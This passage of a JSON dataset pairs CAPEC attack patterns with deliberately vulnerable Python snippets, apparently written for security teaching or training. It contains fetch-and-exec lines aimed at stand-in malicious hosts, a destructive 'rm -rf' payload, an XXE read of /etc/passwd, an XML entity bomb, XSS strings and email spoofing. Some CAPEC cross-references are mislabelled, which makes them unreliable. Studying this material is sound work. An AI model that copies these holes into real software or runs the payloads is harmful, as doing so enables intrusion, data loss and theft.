        "code_snippet": "import imaplib\nimport smtplib\n\n# Simulated user input\nuser_input = \"INBOX; LOGOUT\"\n\n# Vulnerable IMAP command injection\ntry:\n    mail = imaplib.IMAP4_SSL('imap.example.com')\n    mail.login('user@example.com', 'password')\n    mail.select(user_input)  # User input directly used in IMAP command\nexcept Exception as e:\n    print(f\"Error: {e}\")\n\n# Vulnerable SMTP command injection\ntry:\n    server = smtplib.SMTP('smtp.example.com', 587)\n    server.starttls()\n    server.login('user@example.com', 'password')\n    server.sendmail('user@example.com', 'recipient@example.com', f\"Subject: Test\\n\\n{user_input}\")  # User input directly used in SMTP command\nexcept Exception as e:\n    print(f\"Error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of IMAP and SMTP command handling, which is susceptible to command injection attacks. The user input is directly used in IMAP and SMTP commands without proper sanitization or validation. This can allow an attacker to inject malicious commands. The code also includes basic error handling that could potentially expose sensitive information through error messages, aligning with CWE-535 and CWE-209. The snippet highlights the importance of proper input validation and sanitization to prevent command injection vulnerabilities."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# Execute the downloaded code without verifying its integrity\nexec(response.text)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = 'Sensitive System Information'\nprint(sensitive_info)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code that could be embedded in the downloaded script\nmalicious_code = '''\ndef malicious_function():\n    print('Executing malicious code')\nmalicious_function()\n'''\nexec(malicious_code)\n",
        "description": "This Python code snippet demonstrates a Software Integrity Attack by downloading and executing code from a remote location without verifying its integrity (CWE-494). It also exposes sensitive system information to unauthorized control (CWE-497) and includes embedded malicious code (CWE-506). The code fetches a script from a URL and executes it directly, which could lead to the execution of malicious code. Additionally, it prints sensitive information, which could be accessed by unauthorized users. Finally, it includes a hardcoded malicious function to illustrate the potential for embedded malicious code."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious-script.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\nif response.status_code == 200:\n    with open('downloaded_script.py', 'wb') as file:\n        file.write(response.content)\n\n    # Execute the downloaded script without verifying its integrity or origin\n    os.system('python downloaded_script.py')\n",
        "description": "This Python code snippet demonstrates a vulnerable scenario where a script is downloaded from a remote location and executed without any integrity checks. The code fetches a Python script from a potentially malicious URL and saves it locally. It then executes the downloaded script without verifying its origin or integrity, which could lead to the execution of embedded malicious code (CWE-506) or a Trojan Horse (CWE-507). This embodies the main idea of the CAPEC 'Malicious Software Download' by showing how an attacker could deceive a user into downloading and running dangerous code."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import requests\n\n# URL of the malicious update\nmalicious_update_url = 'http://malicious.example.com/update'\n\n# Download the update without integrity check\nresponse = requests.get(malicious_update_url)\n\n# Execute the downloaded code\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a 'Malicious Software Update' attack. The code downloads an update from a URL without performing any integrity checks (CWE-494). The downloaded content is then executed directly, which could contain embedded malicious code (CWE-506) or act as a Trojan horse (CWE-507). This represents the main idea of the CAPEC, where an adversary tricks a user or system into downloading and executing harmful code under the guise of a legitimate update."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\n\n# URL of the update server\nupdate_url = 'http://malicious-server.com/update'\n\n# Download the update without verifying its integrity\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # Execute the downloaded code without validation\n    exec(response.text)\nelse:\n    print('Failed to download update')",
        "description": "This Python code snippet demonstrates a vulnerable automated software update mechanism. The code downloads an update from a specified URL and executes it without verifying the origin or integrity of the downloaded code. This embodies the main idea of CAPEC-494, where an attacker can exploit the lack of proper authentication and integrity checks to introduce malicious code. The code also touches on CWE-494 (Download of Code Without Integrity Check) and CWE-807 (Reliance on Untrusted Inputs in a Security Decision), as it relies on untrusted input (the downloaded code) for a critical security decision (executing the update)."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import base64\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# Using base64 for encoding sensitive data (not secure for cryptographic purposes)\ndef encode_sensitive_data(data):\n    return base64.b64encode(data.encode()).decode()\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Storing sensitive information in a global variable\nsensitive_info = encode_sensitive_data('SuperSecretPassword')\n\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n# Undocumented backdoor function\n\ndef backdoor_access():\n    return base64.b64decode(sensitive_info.encode()).decode()\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Dummy security check that might be optimized away by the processor\nsecurity_check = True\nif security_check:\n    print('Security check passed')\n\n# Function to demonstrate reverse engineering vulnerability\n# An attacker could reverse engineer the code to discover the backdoor\nprint('Encoded sensitive info:', sensitive_info)\nprint('Decoded via backdoor:', backdoor_access())",
        "description": "This Python code snippet demonstrates several vulnerabilities related to reverse engineering and the associated CWEs. The `encode_sensitive_data` function uses base64 encoding, which is not secure for cryptographic purposes (CWE-327). Sensitive information is stored in a global variable `sensitive_info`, making it accessible to unauthorized actors (CWE-497). An undocumented backdoor function `backdoor_access` is included, which can be exploited by attackers (CWE-1242). A dummy security check is present, which might be optimized away by the processor, potentially removing critical security mechanisms (CWE-1037). The code illustrates how an attacker could reverse engineer the application to discover and exploit these vulnerabilities."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import time\nimport random\n\n# Simulate a sensitive operation with observable discrepancies\nclass SensitiveOperation:\n    def __init__(self, secret):\n        self.secret = secret\n\n    def check_secret(self, input_secret):\n        # Simulate a time delay based on the correctness of the input\n        if input_secret == self.secret:\n            time.sleep(0.1)  # Correct secret\n            return True\n        else:\n            time.sleep(0.5)  # Incorrect secret\n            return False\n\n# Simulate an attacker performing black box reverse engineering\nclass Attacker:\n    def __init__(self, operation):\n        self.operation = operation\n\n    def guess_secret(self):\n        possible_secrets = ['secret1', 'secret2', 'secret3', 'secret4']\n        for guess in possible_secrets:\n            start_time = time.time()\n            result = self.operation.check_secret(guess)\n            end_time = time.time()\n            elapsed_time = end_time - start_time\n            print(f\"Guess: {guess}, Time taken: {elapsed_time:.2f} seconds, Result: {result}\")\n\n# Example usage\nsensitive_operation = SensitiveOperation('secret3')\nattacker = Attacker(sensitive_operation)\nattacker.guess_secret()",
        "description": "This Python code snippet demonstrates a scenario where an attacker uses black box reverse engineering techniques to discover a secret value by observing time discrepancies in the responses of a sensitive operation. The `SensitiveOperation` class simulates a security check that takes different amounts of time to respond based on whether the input secret is correct or not. The `Attacker` class attempts to guess the secret by measuring the time taken for each response. This embodies the CAPEC concept of black box reverse engineering and highlights CWE-203 (Observable Discrepancy) by showing how timing information can leak sensitive information."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import os\nimport requests\n\n# Hidden functionality: Download and execute code from a remote server\n# CWE-912: Hidden Functionality\n# CWE-494: Download of Code Without Integrity Check\n# CWE-506: Embedded Malicious Code\n\ndef hidden_functionality():\n    url = 'http://malicious-server.com/malicious_code.py'\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n\n# Main function that appears benign\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1323: Improper Management of Sensitive Trace Data\n\ndef main():\n    print('This is a benign function')\n    sensitive_data = os.popen('uname -a').read()\n    print(f'Sensitive Data: {sensitive_data}')\n\nif __name__ == '__main__':\n    main()\n    hidden_functionality()",
        "description": "This Python code snippet demonstrates the concept of reverse engineering an executable to expose hidden functionality. The `hidden_functionality` function represents hidden and potentially malicious code that downloads and executes a script from a remote server without verifying its integrity (CWE-494). This function is not documented or obvious to the user (CWE-912) and could contain malicious code (CWE-506). The `main` function appears benign but exposes sensitive system information (CWE-497) and improperly manages sensitive trace data (CWE-1323). This code embodies the main idea of the CAPEC by illustrating how hidden functionality can be embedded within an executable, making it susceptible to reverse engineering and exploitation."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "import hashlib\n\n# Hard-coded sensitive constants\nSECRET_KEY = 'my_secret_key'\nPASSWORD = 'password123'\n\n# Function that uses the hard-coded credentials\ndef authenticate(user_input):\n    if user_input == PASSWORD:\n        return 'Authenticated'\n    else:\n        return 'Access Denied'\n\n# Function that uses the hard-coded secret key\ndef generate_hash(data):\n    return hashlib.sha256((data + SECRET_KEY).encode()).hexdigest()\n\n# Example usage\nuser_input = 'password123'\nprint(authenticate(user_input))\nprint(generate_hash('sensitive_data'))",
        "description": "This Python code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive constants such as a password and a secret key. The `authenticate` function uses a hard-coded password for authentication, and the `generate_hash` function uses a hard-coded secret key to generate a hash. This code is vulnerable because an adversary can discover these hard-coded values through static or dynamic analysis, leading to potential security breaches. The code embodies CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants), and CWE-318 (Cleartext Storage of Sensitive Information in Executable)."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import socket\n\n# Insecure communication setup\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to the address and port\nsock.bind(server_address)\n\n# Listen for incoming connections\nsock.listen(1)\n\nwhile True:\n    # Wait for a connection\n    connection, client_address = sock.accept()\n    try:\n        # Receive the data in small chunks and retransmit it\n        while True:\n            data = connection.recv(16)\n            if data:\n                # Transmit sensitive data in cleartext\n                print(f'Received: {data}')\n                connection.sendall(data)\n            else:\n                break\n    finally:\n        # Clean up the connection\n        connection.close()",
        "description": "This Python code snippet demonstrates a simple TCP server that transmits data in cleartext, embodying the concept of 'Protocol Analysis' (CAPEC-272). The server listens for incoming connections and echoes back any received data without encryption, making it vulnerable to eavesdropping (CWE-319: Cleartext Transmission of Sensitive Information). This setup can be easily analyzed and exploited by an adversary to intercept and decipher protocol information. The code also lacks any negotiation for secure algorithms, potentially leading to the use of less secure algorithms (CWE-757: Algorithm Downgrade)."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/include', methods=['GET'])\ndef include_file():\n    file = request.args.get('file')\n    if file:\n        try:\n            with open(file, 'r') as f:\n                return f.read()\n        except Exception as e:\n            return str(e)\n    return 'No file specified'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a web application using Flask that includes a file specified by the user through a URL parameter. The main idea of the CAPEC (PHP Remote File Inclusion) is represented here by allowing the user to specify a file to be included and executed. The code does not properly sanitize or restrict the input, leading to potential vulnerabilities such as arbitrary file inclusion and execution. This can be exploited by an attacker to include and execute malicious files. The related CWEs are also represented: CWE-98 (Improper Control of Filename for Include/Require Statement) is shown by the direct use of the 'file' parameter without validation, CWE-80 (Improper Neutralization of Script-Related HTML Tags) is indirectly represented as the included file could contain malicious scripts, CWE-646 (Reliance on File Name or Extension) is shown by the reliance on the file name provided by the user, CWE-433 (Unparsed Raw Web Content Delivery) is represented by the potential delivery of raw file content, and CWE-553 (Command Shell in Externally Accessible Directory) is indirectly represented as an attacker could include a shell script file."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable email sending function\n\ndef send_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address  # This can be easily spoofed\n    msg['To'] = to_address\n\n    # Connect to the SMTP server\n    with smtplib.SMTP('localhost') as server:\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click the link below to update your account.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that allows an attacker to spoof the 'From' address. The function `send_email` takes in the recipient's email address, the sender's email address, the subject, and the body of the email. It then constructs the email message and sends it using the `smtplib` library. The vulnerability lies in the fact that the 'From' address can be easily spoofed, as there is no proper authentication or verification of the sender's identity. This embodies the main idea of the CAPEC 'Fake the Source of Data' and is related to CWEs such as Improper Authentication (CWE-287), Improper Verification of Source of a Communication Channel (CWE-940), and Authentication Bypass by Spoofing (CWE-290)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-1390: Weak Authentication\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\ndef send_spoofed_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address  # Spoofed sender address\n    msg['To'] = to_address\n\n    try:\n        with smtplib.SMTP('smtp.example.com') as server:\n            server.sendmail(from_address, [to_address], msg.as_string())\n        print('Email sent successfully')\n    except Exception as e:\n        print(f'Failed to send email: {e}')\n\n# Example usage\nsend_spoofed_email('victim@example.com', 'spoofed_sender@example.com', 'Important Update', 'Please click the link to update your account.')",
        "description": "This Python code snippet demonstrates a Principal Spoof attack by sending an email that appears to come from a legitimate source. The function `send_spoofed_email` takes in the recipient's email address, a spoofed sender address, a subject, and the body of the email. It constructs the email and sends it using the `smtplib` library. This embodies the CAPEC concept by showing how an adversary can craft a message that appears to come from a trusted source without using stolen or spoofed authentication credentials. The code also touches on related CWEs: CWE-290 (Authentication Bypass by Spoofing) by not verifying the sender's identity, CWE-1390 (Weak Authentication) by not ensuring the sender's identity is correct, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by potentially sending the email to an unintended recipient."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import hashlib\nimport time\nimport random\n\n# Weak credentials (CWE-1391)\nSECRET_KEY = 'default_secret_key'\n\n# Function to generate a session token\n# Improper control of a resource through its lifetime (CWE-664)\ndef generate_session_token(user_id):\n    timestamp = str(int(time.time()))\n    random_number = str(random.randint(1000, 9999))\n    session_string = user_id + timestamp + random_number + SECRET_KEY\n    session_token = hashlib.sha256(session_string.encode()).hexdigest()\n    return session_token\n\n# Function to validate a session token\n# Insufficient session expiration (CWE-613)\ndef validate_session_token(session_token, user_id):\n    current_time = int(time.time())\n    for i in range(1000, 10000):\n        for t in range(current_time - 3600, current_time + 1):  # 1 hour window\n            session_string = user_id + str(t) + str(i) + SECRET_KEY\n            valid_token = hashlib.sha256(session_string.encode()).hexdigest()\n            if valid_token == session_token:\n                return True\n    return False\n\n# Example usage\nuser_id = 'user123'\nforged_token = generate_session_token(user_id)\nprint(f'Forged Token: {forged_token}')\n\n# Validate the forged token\nis_valid = validate_session_token(forged_token, user_id)\nprint(f'Is the forged token valid? {is_valid}')",
        "description": "This Python code snippet demonstrates the concept of 'Session Credential Falsification through Forging' (CAPEC). The code includes weak credentials (CWE-1391) by using a default secret key, and it improperly controls the resource through its lifetime (CWE-664) by generating session tokens based on predictable elements like user ID, timestamp, and a random number. The session token validation function allows for insufficient session expiration (CWE-613) by validating tokens within a 1-hour window, making it easier for an attacker to forge a valid session token. The example usage shows how a forged token can be generated and validated, illustrating the vulnerability."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Define a recursive XML entity expansion\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY a \"1234567890\" >\n<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\" >\n<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\" >\n<!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\" >\n<!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\" >\n<!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\" >\n<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\" >\n<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\" >\n<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;\" >\n<!ENTITY j \"&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;\" >\n<!ENTITY k \"&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;\" >\n<!ENTITY l \"&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;\" >\n<!ENTITY m \"&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;\" >\n<!ENTITY n \"&m;&m;&m;&m;&m;&m;&m;&m;&m;&m;\" >\n<!ENTITY o \"&n;&n;&n;&n;&n;&n;&n;&n;&n;&n;\" >\n<!ENTITY p \"&o;&o;&o;&o;&o;&o;&o;&o;&o;&o;\" >\n<!ENTITY q \"&p;&p;&p;&p;&p;&p;&p;&p;&p;&p;\" >\n<!ENTITY r \"&q;&q;&q;&q;&q;&q;&q;&q;&q;&q;\" >\n<!ENTITY s \"&r;&r;&r;&r;&r;&r;&r;&r;&r;&r;\" >\n<!ENTITY t \"&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;\" >\n<!ENTITY u \"&t;&t;&t;&t;&t;&t;&t;&t;&t;&t;\" >\n<!ENTITY v \"&u;&u;&u;&u;&u;&u;&u;&u;&u;&u;\" >\n<!ENTITY w \"&v;&v;&v;&v;&v;&v;&v;&v;&v;&v;\" >\n<!ENTITY x \"&w;&w;&w;&w;&w;&w;&w;&w;&w;&w;\" >\n<!ENTITY y \"&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;\" >\n<!ENTITY z \"&y;&y;&y;&y;&y;&y;&y;&y;&y;&y;\" >\n]>\n<root>&z;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\nexcept ET.ParseError as e:\n    print(f\"Parse error: {e}\")",
        "description": "This Python code snippet demonstrates an Exponential Data Expansion attack using XML entity expansion. The XML data contains nested entity definitions that expand exponentially, leading to excessive memory and CPU usage when parsed. The code attempts to parse this XML data using the xml.etree.ElementTree module, which can result in a denial of service due to resource exhaustion. This example embodies the CAPEC concept of Exponential Data Expansion and highlights related CWEs such as improper restriction of recursive entity references (CWE-776) and allocation of resources without limits (CWE-770)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/error')\ndef error_page():\n    error_message = request.args.get('msg', '')\n    if not error_message:\n        abort(400)\n    # Vulnerable to XSS\n    return f'<html><body><h1>Error: {error_message}</h1></body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes an error page. The error page takes a 'msg' parameter from the URL query string and displays it directly in the HTML response without proper sanitization. This makes the application vulnerable to Cross-Site Scripting (XSS) attacks, as described in the CAPEC. An attacker could craft a URL with a malicious script in the 'msg' parameter, which would then be executed in the context of the error page. This example embodies the main idea of the CAPEC by demonstrating how improper neutralization of input in an error message can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Incomplete denylist and improper neutralization of alternate XSS syntax\n    denylist = ['<script>', '</script>', 'script']\n    for item in denylist:\n        query = query.replace(item, '')\n    # Vulnerable to XSS using alternate syntax\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>', query=query)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks due to improper neutralization of alternate XSS syntax and an incomplete denylist. The application has a search endpoint that takes user input from the query parameter 'q'. It attempts to sanitize the input by removing certain script tags using a denylist. However, this denylist is incomplete and does not account for alternate forms of the 'script' tag (e.g., 'ScRiPt'), making it possible for an attacker to bypass the filter and execute malicious scripts. The code highlights the risks associated with relying on denylist-based protection mechanisms and failing to properly neutralize user input."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import re\n\ndef process_input(user_input):\n    # Input filter removed, allowing potentially dangerous input\n    # filtered_input = re.sub(r'[<>\"'']', '', user_input)  # This line is commented out\n    return user_input\n\n# Example usage\nuser_input = \"<script>alert('XSS');</script>\"\nprocessed_input = process_input(user_input)\nprint(f\"Processed Input: {processed_input}\")\n\n# Simulating output without proper neutralization\nprint(f\"Output: {processed_input}\")",
        "description": "This Python code snippet demonstrates the removal of input filters, which is the main idea of the CAPEC. The function `process_input` is supposed to filter out potentially dangerous characters from the user input, but the filtering mechanism is commented out, allowing the input to pass through unfiltered. This can lead to various vulnerabilities, such as XSS (Cross-Site Scripting), as shown in the example usage where a script tag is passed through and printed without any neutralization. This snippet embodies CWE-20 (Improper Input Validation), CWE-184 (Incomplete List of Disallowed Inputs), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function to parse XML data\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        return root\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Example of serialized XML data with an external entity reference\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n    <data>&ext;</data>\n</root>\n'''\n\n# Parse the XML data\nroot = parse_xml(xml_data)\n\n# Print the parsed data\nif root is not None:\n    for child in root:\n        print(child.tag, child.text)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The `parse_xml` function uses the `xml.etree.ElementTree` module to parse XML data. The provided `xml_data` contains an external entity reference (`&ext;`) that points to a local file (`/etc/passwd`). When the XML is parsed, the external entity is resolved, potentially exposing sensitive information from the file system. This example highlights CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data), as the XML parser does not restrict external entity references, leading to potential security risks."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import requests\n\nclass MaliciousClient:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def bypass_authentication(self):\n        # CWE-603: Use of Client-Side Authentication\n        response = requests.get(self.target_url, headers={'Authorization': 'Bearer fake_token'})\n        return response.text\n\n    def inject_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        payload = {'data': '<script>alert(\"Malicious Code\")</script>'}\n        response = requests.post(self.target_url, data=payload)\n        return response.status_code\n\n    def create_emergent_resource(self):\n        # CWE-1229: Creation of Emergent Resource\n        response = requests.post(self.target_url + '/create_resource', data={'resource_name': 'malicious_resource'})\n        return response.status_code\n\n# Example usage\nclient = MaliciousClient('http://example.com/api')\nprint(client.bypass_authentication())\nprint(client.inject_malicious_code())\nprint(client.create_emergent_resource())",
        "description": "This Python code snippet demonstrates a malicious client that interacts with a target service, violating the assumptions the service makes about its clients. The `MaliciousClient` class includes methods that exploit common weaknesses: `bypass_authentication` (CWE-603) bypasses server-side authentication by sending a fake token, `inject_malicious_code` (CWE-506) sends a payload with embedded malicious code, and `create_emergent_resource` (CWE-1229) creates a new resource on the server that could be used for further attacks. This code embodies the main idea of CAPEC-602 by showing how a malicious client can exploit server-side vulnerabilities."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\ndef manipulate_registry(key_path, value_name, new_value):\n    try:\n        # Open the registry key\n        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)\n        # Set the new value\n        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, new_value)\n        winreg.CloseKey(registry_key)\n        print(f'Successfully modified {value_name} to {new_value}')\n    except Exception as e:\n        print(f'Failed to modify registry: {e}')\n\n# Example usage\nmanipulate_registry(r'Software\\ExampleApp', 'ConfigValue', 'NewConfig')",
        "description": "This Python code snippet demonstrates how to manipulate Windows Registry information, which aligns with the CAPEC description of 'Manipulate Registry Information'. The function `manipulate_registry` takes a registry key path, a value name, and a new value as arguments. It opens the specified registry key with write permissions and sets the new value. This action can be used to modify application configurations or hide indicators of compromise. The code also highlights CWE-15 (External Control of System or Configuration Setting) by allowing external input to control registry settings, and CWE-314 (Cleartext Storage in the Registry) by storing the new value in cleartext."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import requests\n\n# Function to fetch sensitive data from a remote server\n# This data will be cached locally without encryption\n\ndef fetch_sensitive_data(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Cache the sensitive data locally\n        with open('cache.txt', 'w') as cache_file:\n            cache_file.write(response.text)\n        return response.text\n    else:\n        return None\n\n# Example usage\nsensitive_url = 'https://example.com/sensitive-data'\ndata = fetch_sensitive_data(sensitive_url)\nprint('Sensitive data fetched and cached.')",
        "description": "This Python code snippet demonstrates a scenario where sensitive data is fetched from a remote server and cached locally in a file named 'cache.txt' without any encryption. This embodies the main idea of the CAPEC 'Lifting Sensitive Data Embedded in Cache' by showing how sensitive information can be stored in a cache that is not appropriately protected. The related CWEs are represented as follows:\n- CWE-524: The code uses a cache to store sensitive information, which can be read by unauthorized actors.\n- CWE-311: The sensitive data is not encrypted before being stored in the cache.\n\nThis example highlights the risk of sensitive data exposure due to improper caching practices and lack of encryption."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "import base64\n\n# Simulating embedded sensitive data in client distribution\nembedded_key = 'c2VjcmV0X2tleQ=='  # Base64 encoded 'secret_key'\n\n# Function to retrieve the embedded key\ndef get_embedded_key():\n    return base64.b64decode(embedded_key).decode('utf-8')\n\n# Simulating client-side authentication using the embedded key\ndef client_side_authentication():\n    key = get_embedded_key()\n    if key == 'secret_key':\n        print('Authentication successful')\n    else:\n        print('Authentication failed')\n\n# Main function to demonstrate the vulnerability\nif __name__ == '__main__':\n    client_side_authentication()",
        "description": "This Python code snippet demonstrates a vulnerability where sensitive data (a secret key) is embedded in the client distribution. The key is base64 encoded and can be easily decoded to retrieve the original secret key. The client-side authentication function uses this embedded key to authenticate the user. This approach is insecure because the key is stored in the client code, making it susceptible to unauthorized retrieval and use. This example embodies the main idea of CAPEC-37 and highlights related CWEs such as CWE-522 (Insufficiently Protected Credentials) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nSIGNING_KEY = 'hardcoded_signing_key.pem'\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod(SIGNING_KEY, 0o777)  # Insecurely setting permissions to the signing key\n\n# CWE-494: Download of Code Without Integrity Check\nmalicious_code_url = 'http://malicious.example.com/malicious_code.py'\nsubprocess.run(['wget', malicious_code_url, '-O', 'malicious_code.py'])\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_code.py', 'a') as f:\n    f.write('\\n# Malicious payload\\n')\n    f.write('os.system(\"rm -rf /important_data\")')\n\n# Signing the malicious code\nsubprocess.run(['openssl', 'dgst', '-sha256', '-sign', SIGNING_KEY, '-out', 'malicious_code.sig', 'malicious_code.py'])\n\nprint('Malicious code signed and ready for distribution.')",
        "description": "This Python code snippet demonstrates a scenario where an adversary uses a hard-coded signing key (CWE-798) to sign malicious code. The signing key is insecurely assigned permissions (CWE-732), making it accessible to unintended actors. The code downloads a malicious script from a remote location without verifying its integrity (CWE-494) and appends a malicious payload to it (CWE-506). Finally, the script signs the malicious code using the hard-coded key, making it appear legitimate to users or tools that verify the signature. This embodies the main idea of the CAPEC, where an adversary signs malicious content with a developer's key, leading users to trust and execute the malicious code."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import requests\n\n# Function to download and execute code from a remote server\ndef download_and_execute(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# Client-side authentication check\ndef client_authenticate(user_token):\n    if user_token == 'trusted_token':\n        return True\n    return False\n\n# Main function\nif __name__ == '__main__':\n    user_token = input('Enter your token: ')\n    if client_authenticate(user_token):\n        download_and_execute('http://example.com/malicious_code.py')\n    else:\n        print('Authentication failed')",
        "description": "This Python code snippet demonstrates a vulnerable implementation where critical functionality is enforced on the client side. The `client_authenticate` function performs authentication on the client side, which can be easily bypassed by modifying the client code. Additionally, the `download_and_execute` function downloads and executes code from a remote server without verifying its integrity, making it susceptible to malicious code execution. This embodies the CAPEC of 'Removing Important Client Functionality' and highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602), 'Use of Client-Side Authentication' (CWE-603), and 'Download of Code Without Integrity Check' (CWE-494)."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
